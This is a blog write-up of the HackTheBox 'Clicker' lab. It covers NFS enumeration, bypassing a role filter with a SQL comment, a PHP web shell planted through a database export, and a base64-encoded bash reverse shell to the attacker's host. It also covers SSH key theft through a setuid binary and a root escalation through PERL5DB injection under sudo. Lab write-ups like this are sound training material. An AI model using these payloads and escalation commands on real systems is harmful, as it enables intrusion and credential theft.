---
layout: post
title: "HTB: Clicker"
author: Andrew Cherney
date: 2024-01-27 02:40:07
tags: htb medium-box linux webapp nfs php sqli binary-exploitation perl
icon: "assets/icons/clicker.png"
post_description: "If you like reading code and searching for vulnerabilities within this box will be a blast. This webapp hosts a game which contains a backup in an NFS share. The save_game.php file shows a the role parameter which needs to be bypassed with mysql comment characters, then the database export admin utility can be leveraged to gain a shell. One binary exploitation and perl exploit later and root is obtained."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $nmap -sC 10.10.11.232
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-01 15:02 CDT
Nmap scan report for 10.10.11.232
Host is up (0.072s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp  open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43421/udp6  mountd
|   100005  1,2,3      43570/udp   mountd
|   100005  1,2,3      48577/tcp6  mountd
|   100005  1,2,3      50833/tcp   mountd
|   100021  1,3,4      36973/udp6  nlockmgr
|   100021  1,3,4      38191/udp   nlockmgr
|   100021  1,3,4      45333/tcp   nlockmgr
|   100021  1,3,4      45415/tcp6  nlockmgr
|   100024  1          41575/udp   status
|   100024  1          47125/udp6  status
|   100024  1          54105/tcp6  status
|   100024  1          60361/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp open  nfs_acl

Nmap done: 1 IP address (1 host up) scanned in 4.89 seconds
```

<h2>Port 80 - http</h2>

![clicker front page](/img/clicker/clicker_front_page.png)

![clicker registration page](/img/clicker/clicker_registration.png)

![discount cookie clicker](/img/clicker/clicker_game.png)


Looks to be a discount cookie clicker game. The save and quit option when intercepted seems to pass parameters to the backend code to update a database. I fuzz the request and get a 500 error, I need more info to abuse this if possible. 

```
GET /save_game.php?clicks=1&level=1 HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=40coq22jkmdko0gjqi56v4jg73
Upgrade-Insecure-Requests: 1
```

After passing this request I am sent back to the front screen with a parameter passed message. I try to inject some html to test for XSS.

```
GET /index.php?msg=Game%20has%20been%20saved!</h5><script>alert(1)</script> HTTP/1.1
Host: clicker.ht
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=05
Accept-Encoding: gzip, deflate
Referer: http://clicker.htb/play.php
DNT: 1
Connection: close
Cookie: PHPSESSID=40coq22jkmdko0gjqi56v4jg73
Upgrade-Insecure-Requests: 1
```

![alert xss front page](/img/clicker/clicker_alert_1.png)

I decided not to prod further and look towards the other port open on the system.

<h2>NFS Shares</h2>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $showmount -e 10.10.11.232
Export list for 10.10.11.232:
/mnt/backups *
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $sudo mount -t nfs 10.10.11.232:/mnt/backups /mnt/raccoon
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $cd /mnt/raccoon/
┌─[raccoon@cyberraccoon-virtualbox]─[/mnt/raccoon]
└──╼ $ls
clicker.htb_backup.zip
```

Well that is evidently source code for the clicker site. Extracting the files I see a familiar php file: `save_game.php`, and after reading the code I see mention to a `db_utils.php`.

```php
db_utils.php

function save_profile($player, $args) {
global $pdo;
$params = ["player"=>$player];
$setStr = "";
foreach ($args as $key => $value) {
$setStr .= $key . "=" . $pdo->quote($value) . ",";
}
$setStr = rtrim($setStr, ",");
$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
$stmt -> execute($params);
}
```

```php
save_game.php

<?php
session_start();
include_once("db_utils.php");
  
if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
$args = [];
foreach($_GET as $key=>$value) {
if (strtolower($key) === 'role') {
// prevent malicious users to modify role
header('Location: /index.php?err=Malicious activity detected!');
die;
}
$args[$key] = $value;
}
save_profile($_SESSION['PLAYER'], $_GET);
// update session info
$_SESSION['CLICKS'] = $_GET['clicks'];
$_SESSION['LEVEL'] = $_GET['level'];
header('Location: /index.php?msg=Game has been saved!');
}
?>
```

The two parameters passed through the url are not being filtered for, and in fact we can change any column in the table we want. There is one problem though, which is role is specifically being filtered out, and that role column is what defines our access to the administration page. 

<h1>User as www-data</h1>

I did come across a line which initiates user accounts so I can see every column in the database:

```
$stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)");
```

I'll throw a test payload to get the malicious activity message to verify this code in the backup zip is actually what's running here.

```
GET /save_game.php?clicks=0&level=0&role=Admin HTTP/1.1
```

![malicious activity detected](/img/clicker/clicker_malicious_activity.png)

In my digging of how to bypass this I came across the ways to make comments in mysql, which consists of the following.

|Type|Description|
|---|---|
|`#`|Hash comment|
|`/* MYSQL Comment */`|C-style comment|
|`/*! MYSQL Special SQL */`|Special SQL|
|`/*!32302 10*/`|Comment for MYSQL version 3.23.02|
|`-- -`|SQL comment|
|`;%00`|Nullbyte|
|`|Backtick|

That inline C-style comment jumps out at me, and perhaps I can append it to the role parameter to bypass the string check for 'role'. 

```
GET /save_game.php?clicks=0&level=0&role/**/=Admin
```

No error message or malicious activity message. But no admin page in sight. Perhaps I need to reload or relog into my raccoon account. 

![admin page from front index](/img/clicker/clicker_admin_page.png)

![admin portal](/img/clicker/clicker_admin_portal.png)

I intercepted that export option and found that I can change the extension of the saved file. Furthermore I checked the admin portal page from the source code and found the following:

`$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];`

This means the extension parameter passed to the backend code is placed directly as the extension. That isn't all I need to get a shell however, but if you think back you'll remember the columns in the table we're working with there is a `nickname` field which we can change to have php code, allowing us to run remote code.

The GET request to change the nickname is as follows.

```
GET /save_game.php?clicks=10000000&level=10000000&nickname=<%3f%3d`$_GET[0]`%3f>&role/**/=Admin
```

Then I can change the extension within the request.

```
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
DNT: 1
Connection: close
Referer: http://clicker.htb/admin.php
Cookie: PHPSESSID=70kfgrm320tieobkjl4cie41da
Upgrade-Insecure-Requests: 1

threshold=10&extension=php
```

![database export](/img/clicker/clicker_database_export.png)

Now heading to that php file I can pass through the `0` parameter and execute commands as www-data and get a shell.


![id check](/img/clicker/clicker_export_cmd_id.png)

It works! Now for an easy shell.

```
echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi83Nzc3IDA+JjEnCg== | base64 -d | bash
%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%59%79%41%6e%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%69%38%33%4e%7a%63%33%49%44%41%2b%4a%6a%45%6e%43%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68

http://clicker.htb/exports/top_players_hx1yqj6z.php?0=%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%59%79%41%6e%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%69%38%33%4e%7a%63%33%49%44%41%2b%4a%6a%45%6e%43%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.232 39696
bash: cannot set terminal process group (1200): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$ 
```

<h1>User as jack</h1>

<h2>execute_query</h2>

```bash
www-data@clicker:/var/www/clicker.htb/exports$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
www-data@clicker:/var/www/clicker.htb/exports$ cd /opt/manage
cd /opt/manage
www-data@clicker:/opt/manage$ ls
ls
README.txt
execute_query
www-data@clicker:/opt/manage$ cat README.txt
cat README.txt
Web application Management

Use the binary to execute the following task:
	- 1: Creates the database structure and adds user admin
	- 2: Creates fake players (better not tell anyone)
	- 3: Resets the admin password
	- 4: Deletes all users except the admin
www-data@clicker:/opt/manage$ ls -al
ls -al
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21 22:29 .
drwxr-xr-x 3 root root  4096 Jul 20 10:00 ..
-rw-rw-r-- 1 jack jack   256 Jul 21 22:29 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
```

That execute_query binary says it only has 4 options in the readme but checking it out in ghidra I see a default 5th option here:

```c
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      sVar4 = strlen((char *)&local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = (char *)calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,(char *)&local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
```

Knowing this I can run strace and check what the binary is doing when it tries to load a file and read it.

```bash
strace ./execute_query 5 /etc/passwd


access("/home/jack/queries//etc/passwd", R_OK) = -1 EACCES (Permission denied)
newfstatat(1, "", {st_mode=S_IFSOCK|0777, st_size=0, ...}, AT_EMPTY_PATH) = 0
write(1, "File not readable or not found\n", 31File not readable or not found
) = 31
exit_group(0)                           = ?
+++ exited with 0 +++
```

We throw up a flag here but also find our next vector. strace is preventing this from running with sudo so the permissions are not there to allow for reading files. But secondly we see that the default directory is `/home/jack/queries/`. I will try and read the ssh key since that is an obvious valuable locked within a home directory. 

```
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
...
...
LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $nano id_rsa
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $chmod 400 id_rsa 
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Clicker]
└──╼ $ssh jack@clicker.htb -i id_rsa 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct  8 08:36:31 PM UTC 2023

  System load:           0.0166015625
  Usage of /:            53.4% of 5.77GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             242
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.232
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5ad2


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jack@clicker:~$ groups
jack adm cdrom sudo dip plugdev
jack@clicker:~$ cat user.txt
41214fe62a9---------------------
```

<h1>Root</h1>

<h2>perl_startup</h2>

```bash
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
jack@clicker:~$ cat /opt/monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

We have sudo access as jack but this bash script doesn't have any user input or manipulatable commands/files. It uses two other commands: curl and xml_pp. Curl cant be used in any way to leverage root in this instance, which leaves the last option for this script as xml_pp. 

```perl
#!/usr/bin/perl -w
# $Id: /xmltwig/trunk/tools/xml_pp/xml_pp 32 2008-01-18T13:11:52.128782Z mrodrigu  $
use strict;

use XML::Twig;
use File::Temp qw/tempfile/;
use File::Basename qw/dirname/;

my @styles= XML::Twig->_pretty_print_styles; # from XML::Twig
my $styles= join '|', @styles;               # for usage
my %styles= map { $_ => 1} @styles;          # to check option

my $DEFAULT_STYLE= 'indented';

my $USAGE= "usage: $0 [-v] [-i<extension>] [-s ($styles)] [-p <tag(s)>] [-e <encoding>] [-l] [-f <file>] [<files>]";

# because of the -i.bak option I don't think I can use one of the core
# option processing modules, so it's custom handling and no clusterization :--(
```

It is odd that this runs with perl. [https://www.exploit-db.com/exploits/39702](https://www.exploit-db.com/exploits/39702) is an exploit allowing local privesc using a flaw within exim. In this instance we are running this with sudo and can bypass needing a vulnerable version of exim. perl_startup as a configuration parameter allows the injection of commands. 


```bash
jack@clicker:/tmp$ sudo PERL5OPT=-d PERL5DB='exec "whoami > /tmp/whoami"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
	(Maybe you meant system() when you said exec()?)
jack@clicker:/tmp$ ls
diag.backup
root.pm
systemd-private-6b70c88545da4dc9bce7b41f791f825f-apache2.service-d1s09J
systemd-private-6b70c88545da4dc9bce7b41f791f825f-ModemManager.service-acnzub
systemd-private-6b70c88545da4dc9bce7b41f791f825f-systemd-logind.service-P5dluN
systemd-private-6b70c88545da4dc9bce7b41f791f825f-systemd-resolved.service-27kfwV
systemd-private-6b70c88545da4dc9bce7b41f791f825f-systemd-timesyncd.service-QB4tgQ
vmware-root_810-2957517899
whoami
jack@clicker:/tmp$ cat whoami
root
jack@clicker:/tmp$ sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
	(Maybe you meant system() when you said exec()?)
jack@clicker:/tmp$ bash -p
bash-5.1# cat /root/root.txt
b94d39a802b--------------------
```

